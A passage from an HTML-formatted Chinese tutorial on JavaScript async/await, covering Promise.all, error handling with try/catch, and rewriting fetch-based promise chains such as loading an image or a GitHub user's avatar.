New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">async function test() { </font></div><div><font style="font-size: 12pt;">  // 以下代码没有依赖性的话，完全可以使用 Promise.all 的方式 </font></div><div><font style="font-size: 12pt;">  // 如果有依赖性的话，其实就是解决回调地狱的例子了 </font></div><div><font style="font-size: 12pt;">  await fetch(url) </font></div><div><font style="font-size: 12pt;">  await fetch(url1) </font></div><div><font style="font-size: 12pt;">  await fetch(url2) </font></div><div><font style="font-size: 12pt;">}</font></div></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">下面代码中，getFoo 和 getBar 是两个独立的异步操作（即互不依赖），被写成继发关系。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">let foo = await getFoo();</font></div><div><font style="font-size: 12pt;">let bar = await getBar();</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">这样比较耗时，因为只有 getFoo 完成以后，才会执行 getBar，完全可以让它们同时触发。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">// 写法一</font></div><div><font style="font-size: 12pt;">let [foo, bar] = await Promise.all([getFoo(), getBar()]);</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">// 写法二</font></div><div><font style="font-size: 12pt;">let fooPromise = getFoo();</font></div><div><font style="font-size: 12pt;">let barPromise = getBar();</font></div><div><font style="font-size: 12pt;">let foo = await fooPromise;</font></div><div><font style="font-size: 12pt;">let bar = await barPromise;</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">当我们需要同时等待多个 promise 时，我们可以用 Promise.all 把它们包装起来，然后使用 await：</span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">// 等待结果数组 </font></div><div><font style="font-size: 12pt;">let results = await Promise.all([fetch(url1), fetch(url2), ... ]);</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">如果出现 error，也会正常传递，从失败了的 promise 传到 Promise.all，我们也可以通过使用 try..catch 包裹 await 捕获到异常。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">一个使用 await 的例子</span></span></div><div><font style="font-size: 12pt;"><br/></font></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">let a = 0;</font></div><div><font style="font-size: 12pt;">let b = async () =&gt; {</font></div><div><font style="font-size: 12pt;">  a = a + await 10;</font></div><div><font style="font-size: 12pt;">  console.log('2', a) // -&gt; '2' 10</font></div><div><font style="font-size: 12pt;">}</font></div><div><font style="font-size: 12pt;">b()</font></div><div><font style="font-size: 12pt;">a++;</font></div><div><font style="font-size: 12pt;">console.log('1', a) // -&gt; '1' 1</font></div></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">对于以上代码你可能会有疑惑，让我来解释下原因</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">● 首先函数 b 先执行，在执行到 await 10 之前变量 a 还是 0，因为 await 内部实现了 generator ，generator 会保留堆栈中的东西，所以这时候 a = 0 被保存了下来</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 因为 await 是异步操作，后面的表达式不返回 Promise 的话，就会包装成 Promise.reslove(返回值)，然后去执行函数外的同步代码</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 同步代码执行完毕后开始执行异步代码，将保存下来的值拿出来使用，这时候 a = 0 + 10</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">上述解释中提到了 await 内部实现了 generator，其实 await 就是 generator 加上 Promise 的语法糖，且内部实现了自动执行 generator。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">如果你熟悉 co 的话，其实自己就可以实现这样的语法糖。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">错误处理</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">await 命令后面的 Promise 对象，运行结果可能是 rejected，所以最好把 await 命令放在 try...catch 代码块中。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">可以用 try 包装多行 await 代码，</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">如果有 error 发生，执行控制权马上就会被移交至 catch 块</span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">async function f() {</font></div><div><font style="font-size: 12pt;">  try {</font></div><div><font style="font-size: 12pt;">    let response = await fetch('/no-user-here');</font></div><div><font style="font-size: 12pt;">    let user = await response.json();</font></div><div><font style="font-size: 12pt;">  } catch(err) {</font></div><div><font style="font-size: 12pt;">    // 捕获到 fetch 和 response.json 中的错误</font></div><div><font style="font-size: 12pt;">    alert(err);</font></div><div><font style="font-size: 12pt;">  }</font></div><div><font style="font-size: 12pt;">}</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">f();</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">如果 promise 被 reject，它将 throw 这个 error，就像在这一行有一个 throw 语句那样。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">这段代码：</span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">async function f() { </font></div><div><font style="font-size: 12pt;">  await Promise.reject(new Error(&quot;Whoops!&quot;));</font></div><div><font style="font-size: 12pt;">}</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">和下面这段是一样的：</span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">async function f() { </font></div><div><font style="font-size: 12pt;">  throw new Error(&quot;Whoops!&quot;); </font></div><div><font style="font-size: 12pt;">}</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">async函数内部抛出错误，会导致返回的 Promise 对象变为 reject 状态。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">抛出的错误对象会被 catch 方法回调函数接收到。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">async function f() {</font></div><div><font style="font-size: 12pt;">  throw new Error('出错了');</font></div><div><font style="font-size: 12pt;">}</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">f().then(</font></div><div><font style="font-size: 12pt;">  v =&gt; console.log('resolve', v),</font></div><div><font style="font-size: 12pt;">  e =&gt; console.log('reject', e)</font></div><div><font style="font-size: 12pt;">)</font></div><div><font style="font-size: 12pt;">// reject Error: 出错了</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">async function f() {</font></div><div><font style="font-size: 12pt;">  await Promise.reject('出错了');</font></div><div><font style="font-size: 12pt;">}</font></div><div><br/></div><div><font style="font-size: 12pt;">f()</font></div><div><font style="font-size: 12pt;">  .then(</font><span style="font-size: 12pt;">v =&gt; console.log(v))</span></div><div><span style="font-size: 12pt;">  .catch(e =&gt; console.log(e))</span></div><div><font style="font-size: 12pt;">// 出错了</font></div></div><div><br/></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">当我们使用 async/await 时，几乎就不会用到 .then 了，因为 await 为我们处理了等待。并且我们使用常规的 try..catch 而不是 .catch。</span></span></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">有时，我们希望即使前一个异步操作失败，也不要中断后面的异步操作。</span></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">这时可以将第一个 await 放在 try...catch 结构里面，这样不管这个异步操作是否成功，第二个 await 都会执行。</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">async function f() {</font></div><div><font style="font-size: 12pt;">  try {</font></div><div><font style="font-size: 12pt;">    await Promise.reject('出错了');</font></div><div><font style="font-size: 12pt;">  } catch(e) {</font></div><div><font style="font-size: 12pt;">  }</font></div><div><font style="font-size: 12pt;">  return await Promise.resolve('hello world');</font></div><div><font style="font-size: 12pt;">}</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">f()</font></div><div><font style="font-size: 12pt;">  .then(v =&gt; console.log(v))</font></div><div><font style="font-size: 12pt;">// hello world</font></div></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">或者 await 后面的 Promise 对象再跟一个 catch 方法，处理前面可能出现的错误。</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">async function f() {</font></div><div><font style="font-size: 12pt;">  await Promise.reject('出错了')</font></div><div><font style="font-size: 12pt;">    .catch(e =&gt; console.log(e));</font></div><div><font style="font-size: 12pt;">  return await Promise.resolve('hello world');</font></div><div><font style="font-size: 12pt;">}</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">f().then(v =&gt; console.log(v))</font></div><div><font style="font-size: 12pt;">// 出错了</font></div><div><font style="font-size: 12pt;">// hello world</font></div></div><div><br/></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">实例：按顺序完成异步操作</span></font></div><div><font style="font-size: 12pt;"><br/></font></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">async function logInOrder(urls) {</font></div><div><font style="font-size: 12pt;">  for (const url of urls) {</font></div><div><font style="font-size: 12pt;">    const response = await fetch(url);</font></div><div><font style="font-size: 12pt;">    console.log(await response.text());</font></div><div><font style="font-size: 12pt;">  }</font></div><div><font style="font-size: 12pt;">}</font></div></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">上面代码问题是所有远程操作都是继发。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">只有前一个 URL 返回结果，才会去读取下一个 URL，这样做效率很差，非常浪费时间。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">我们需要的是并发发出远程请求。</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">async function logInOrder(urls) {</font></div><div><font style="font-size: 12pt;">  // 并发读取远程URL</font></div><div><font style="font-size: 12pt;">  const textPromises = urls.map(async url =&gt; {</font></div><div><font style="font-size: 12pt;">    const response = await fetch(url);</font></div><div><font style="font-size: 12pt;">    return response.text();</font></div><div><font style="font-size: 12pt;">  });</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">  // 按次序输出</font></div><div><font style="font-size: 12pt;">  for (const textPromise of textPromises) {</font></div><div><font style="font-size: 12pt;">    console.log(await textPromise);</font></div><div><font style="font-size: 12pt;">  }</font></div><div><font style="font-size: 12pt;">}</font></div></div><div><br/></div><div><span style="font-size: 12pt;">上面代码中，虽然 map 方法的参数是 async 函数，但它是并发执行的，因为只有 async 函数内部是继发执行，外部不受影响。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">后面的 for..of 循环内部使用了 await，因此实现了按顺序输出。</span></div><div style="text-align: start;"><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><span style="font-size: 12pt; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal; font-weight: bold;">使用 async/await 改造 fetch</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><font style="font-size: 12pt;"><br/></font></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">fetch('coffee.jpg')</font></div><div><font style="font-size: 12pt;">  .then(response =&gt; response.blob())</font></div><div><font style="font-size: 12pt;">  .then(myBlob =&gt; {</font></div><div><font style="font-size: 12pt;">    let objectURL = URL.createObjectURL(myBlob);</font></div><div><font style="font-size: 12pt;">    let image = document.createElement('img');</font></div><div><font style="font-size: 12pt;">    image.src = objectURL;</font></div><div><font style="font-size: 12pt;">    document.body.appendChild(image);</font></div><div><font style="font-size: 12pt;">  })</font></div><div><font style="font-size: 12pt;">  .catch(e =&gt; {</font></div><div><font style="font-size: 12pt;">    console.log('There has been a problem with your fetch operation: ' + e.message);</font></div><div><font style="font-size: 12pt;">  });</font></div></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><br/></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 8px; font-size: 12px; border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15); letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">async function myFetch() {</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  let response = await fetch('coffee.jpg');</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  let myBlob = await response.blob();</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  let objectURL = URL.createObjectURL(myBlob);</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  let image = document.createElement('img');</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  image.src = objectURL;</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  document.body.appendChild(image);</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">}</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">myFetch();</span></div></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><br style="box-sizing: border-box; -webkit-tap-highlight-color: transparent;"/></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;">它使代码更简单，更容易理解 — 不用到处都是 .then() 代码块！</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><br style="box-sizing: border-box; -webkit-tap-highlight-color: transparent;"/></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 8px; font-size: 12px; border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15); letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">fetch('/article/promise-chaining/user.json')</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  .then(response =&gt; response.json())</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  .then(user =&gt; fetch(`https://api.github.com/users/${user.name}`))</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  .then(response =&gt; response.json())</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  .then(githubUser =&gt; new Promise(function(resolve, reject) { // (*)</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">    let img = document.createElement('img');</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">    img.src = githubUser.avatar_url;</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">    img.className = &quot;promise-avatar-example&quot;;</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">    document.body.append(img);</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">    setTimeout(() =&gt; {</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">      img.remove();</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">      resolve(githubUser); // (**)</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">    }, 3000);</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  }))</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  // 3 秒后触发</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  .then(githubUser =&gt; alert(`Finished showing ${githubUser.name}`));</span></div></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><br style="box-sizing: border-box; -webkit-tap-highlight-color: transparent;"/></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;">让我们拿 showAvatar() 例子，并将其改写成 async/await 的形式：</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><br style="box-sizing: border-box; -webkit-tap-highlight-color: transparent;"/></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; letter-spacing: normal; orphans: 2; text-indent: 0px; 